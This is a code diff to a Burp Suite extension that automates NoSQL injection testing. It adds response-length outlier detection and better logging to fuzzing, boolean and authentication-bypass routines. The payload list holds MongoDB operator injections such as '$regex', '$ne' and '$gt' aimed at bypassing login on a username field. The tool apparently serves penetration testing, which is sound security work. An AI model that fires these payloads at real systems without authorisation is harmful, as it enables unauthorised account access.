@@ -10,12 +10,8 @@ import burp.api.montoya.ui.editor.HttpRequestEditor;
 import burp.api.montoya.ui.editor.HttpResponseEditor;
 
 import javax.swing.*;
-import javax.swing.table.DefaultTableModel;
-import javax.swing.table.TableModel;
-import javax.swing.table.TableRowSorter;
 import java.awt.*;
-import java.util.ArrayList;
-import java.util.Comparator;
+import java.util.*;
 
 import static burp.api.montoya.ui.editor.EditorOptions.READ_ONLY;
 
@@ -41,7 +37,7 @@ public class NNN implements BurpExtension {
         // Payloads for username field
         this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_USERNAME, urlEncodeData("{\"$regex\":\"admin.*\"}"), "{\"$regex\":\"admin.*\"}", null));
         this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_USERNAME, urlEncodeData("\"admin\""), "\"admin\"", null));
-        this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_USERNAME, urlEncodeData("{\"$regex\":\"admin .*\"}"), "{\"$regex \":\"admin.*\"}", null));
+        this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_USERNAME, urlEncodeData("{\"$regex\":\"admin.*\"}"), "{\"$regex \":\"admin.*\"}", null));
         this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_USERNAME, urlEncodeData("{\"$ne\":null}"), "{\"$ne\":null}", null));
         this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_USERNAME, urlEncodeData("{\"$ne\":\"foo\"}"), "{\"$ne\":\"foo\"}", null));
         this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_USERNAME, urlEncodeData("{\"$gt\":undefined}"), "{\"$gt\":undefined}", null));
@@ -151,6 +147,65 @@ public class NNN implements BurpExtension {
     }
 
 
+    private static double calculateMean(ArrayList<HttpRequestResponse> objects) {
+        double sum = 0;
+        for (HttpRequestResponse obj : objects) {
+            sum += obj.response().toString().length();
+        }
+        return sum / objects.size();
+    }
+
+    private static double calculateStandardDeviation(ArrayList<HttpRequestResponse> objects, double mean) {
+        double sum = 0;
+        for (HttpRequestResponse obj : objects) {
+            double diff = obj.response().toString().length() - mean;
+            sum += diff * diff;
+        }
+        return Math.sqrt(sum / objects.size());
+    }
+
+    private static ArrayList<HttpRequestResponse> findOutliers(ArrayList<HttpRequestResponse> objects, double mean, double stdDev) {
+        ArrayList<HttpRequestResponse> outliers = new ArrayList<>();
+        for (HttpRequestResponse obj : objects) {
+            double value = obj.response().toString().length();
+            if (Math.abs(value - mean) > 2 * stdDev) {  // Adjust the accuracy
+                outliers.add(obj);
+            }
+        }
+        return outliers;
+    }
+
+    private static <T> ArrayList<T> removeDuplicates(ArrayList<T> list) {
+        HashSet<T> set = new HashSet<>(list);
+        return new ArrayList<>(set);
+    }
+
+    static void printSuspiciousResponses(ArrayList<HttpRequestResponse> responseList) {
+        // Calculate the maean
+        double mean = calculateMean(responseList);
+        // Calculate the standard deviation
+        double stdDev = calculateStandardDeviation(responseList, mean);
+        // Find objects with instance parameter values that stand out
+        ArrayList<HttpRequestResponse> outliers = findOutliers(responseList, mean, stdDev);
+        for (HttpRequestResponse resp : responseList) {
+            if (resp.response().statusCode() != 200 && resp.response().statusCode() != 400) {
+                outliers.add(resp);
+            }
+        }
+        outliers = removeDuplicates(outliers);
+        // Sort outliers by status codes
+        outliers.sort(new Comparator<HttpRequestResponse>() {
+            @Override
+            public int compare(HttpRequestResponse o1, HttpRequestResponse o2) {
+                return Integer.compare(o1.response().statusCode(), o2.response().statusCode());
+            }
+        });
+        for (HttpRequestResponse obj : outliers) {
+            infoPane.setText(infoPane.getText() + "Status Code: " + obj.response().statusCode() + "        Length: " + String.format("%" + 8 + "s", obj.response().toString().length()) + "       Payload: " + (obj.request().query().isBlank() ? api.utilities().urlUtils().decode(obj.request().body()) : api.utilities().urlUtils().decode(obj.request().query())) + "\n");
+        }
+    }
+
+
     static void fuzzstringTest(HttpRequestResponse requestResponse, Integer startIndex, Integer endIndex) {
         new Thread(() -> {
             try {
@@ -169,8 +224,9 @@ public class NNN implements BurpExtension {
                             response2receive = api.http().sendRequest(request2send);
                         }
                         if (response2receive.response().statusCode() != 200) {
-                            infoPane.setText(infoPane.getText() + "Status Code: " + response2receive.response().statusCode() + "        Length: " + String.format("%" + 8 + "s", response2receive.response().toString().length()) + "       Payload: " + payload.payload + "\n");
+                            infoPane.setText(infoPane.getText() + "Status Code: " + response2receive.response().statusCode() + "        Length: " + String.format("%" + 8 + "s", response2receive.response().toString().length()) + "       Payload: " + (response2receive.request().query().isBlank() ? api.utilities().urlUtils().decode(response2receive.request().body()) : api.utilities().urlUtils().decode(response2receive.request().query())) + "\n");
                         }
+                        ArrayList<HttpRequestResponse> responseList = new ArrayList<>(); // Collect responses to later analyze them
                         for (int i = 0; i < payload.payload.length(); i++) {
                             char c = payload.payload.charAt(i);
                             request2send = HttpRequest.httpRequest(httpService, requestResponse.request().toString());
@@ -181,10 +237,10 @@ public class NNN implements BurpExtension {
                                 request2send = HttpRequest.httpRequest(httpService, requestResponse.request().toString().substring(0, startIndex) + api.utilities().urlUtils().encode(String.valueOf(c)) + requestResponse.request().toString().substring(endIndex));
                                 response2receive = api.http().sendRequest(request2send);
                             }
-                            if (response2receive.response().statusCode() != 200) {
-                                infoPane.setText(infoPane.getText() + "Status Code: " + response2receive.response().statusCode() + "        Length: " + String.format("%" + 8 + "s", response2receive.response().toString().length()) + "       Payload: " + c + "\n");
-                            }
+                            responseList.add(response2receive);
                         }
+                        printSuspiciousResponses(responseList);
+
                     }
                 }
             } catch (Exception e) {
@@ -195,12 +251,13 @@ public class NNN implements BurpExtension {
     }
 
     static void booleanTest(HttpRequestResponse requestResponse, Integer startIndex, Integer endIndex) {
-        api.logging().logToOutput("[i] Selected request:\n" + requestResponse.request().toString() + "\n");
         new Thread(() -> {
             try {
+                infoPane.setText(infoPane.getText() + "[i] Boolean Test\n");
                 HttpRequest request2send;
                 HttpRequestResponse response2receive;
                 HttpService httpService = requestResponse.request().httpService();
+                ArrayList<HttpRequestResponse> responseList = new ArrayList<>(); // Collect responses to later analyze them
                 for (Payload payload : payloadsArrayList){
                     if (payload.payloadType == PayloadType.BOOLEAN) {
                         request2send = HttpRequest.httpRequest(httpService, requestResponse.request().toString().substring(0, startIndex) + payload.payloadUrlEncoded + requestResponse.request().toString().substring(endIndex));
@@ -211,10 +268,13 @@ public class NNN implements BurpExtension {
                             response2receive = api.http().sendRequest(request2send);
                         }
                         api.logging().logToOutput("[i] Response:\n" + response2receive.response().toString() + "\n");
+                        responseList.add(response2receive);
                     }
                 }
+                printSuspiciousResponses(responseList);
             } catch (Exception e) {
-                api.logging().logToOutput("[!] Request failed");
+                api.logging().logToError("[!] Boolean module failed");
+                api.logging().logToError(e);
             }
         }).start();
     }
@@ -275,12 +335,13 @@ public class NNN implements BurpExtension {
 
 
     static void authenticationTest(HttpRequestResponse requestResponse, Integer startUsernameIndex, Integer endUsernameIndex, Integer startPasswordIndex, Integer endPasswordIndex) {
-        api.logging().logToOutput("[i] Selected request:\n" + requestResponse.request().toString() + "\n");
         new Thread(() -> {
             try {
+                infoPane.setText(infoPane.getText() + "[i] Authentication Test\n");
                 HttpRequest request2send;
                 HttpRequestResponse response2receive;
                 HttpService httpService = requestResponse.request().httpService();
+                ArrayList<HttpRequestResponse> responseList = new ArrayList<>(); // Collect responses to later analyze them
                 for (Payload payload1 : payloadsArrayList){
                     if (payload1.payloadType == PayloadType.AUTHENTICATION_BYPASS_USERNAME) {
                         for (Payload payload2 : payloadsArrayList) {
@@ -295,6 +356,7 @@ public class NNN implements BurpExtension {
                                     }
                                     api.logging().logToOutput("[i] Modified request:\n" + request2send.toString() + "\n");
                                     response2receive = api.http().sendRequest(request2send.withUpdatedHeader("Content-Length", String.valueOf(request2send.body().length())));
+                                    responseList.add(response2receive);
                                 } else {
                                     if (startUsernameIndex > startPasswordIndex) {
                                         request2send = HttpRequest.httpRequest(httpService, requestResponse.request().toString().substring(0, startUsernameIndex) + payload1.payloadUrlEncoded + requestResponse.request().toString().substring(endUsernameIndex));
@@ -305,19 +367,23 @@ public class NNN implements BurpExtension {
                                     }
                                     api.logging().logToOutput("[i] Modified request:\n" + request2send.toString() + "\n");
                                     response2receive = api.http().sendRequest(request2send);
+                                    responseList.add(response2receive);
                                 }
                                 api.logging().logToOutput("[i] Response:\n" + response2receive.response().toString() + "\n");
                             }
                         }
                     }
                 }
+                printSuspiciousResponses(responseList);
             } catch (Exception e) {
-                api.logging().logToOutput("[!] Request failed");
+                api.logging().logToError("[!] Authentication module failed");
+                api.logging().logToError(e);
             }
         }).start();
     }
 
     static void extractFieldNames(HttpRequestResponse requestResponse) {
+        infoPane.setText(infoPane.getText() + "[i] Extraction of field names\n");
         api.logging().logToOutput("[i] Selected request:\n" + requestResponse.request().toString() + "\n");
         new Thread(() -> {
             try {
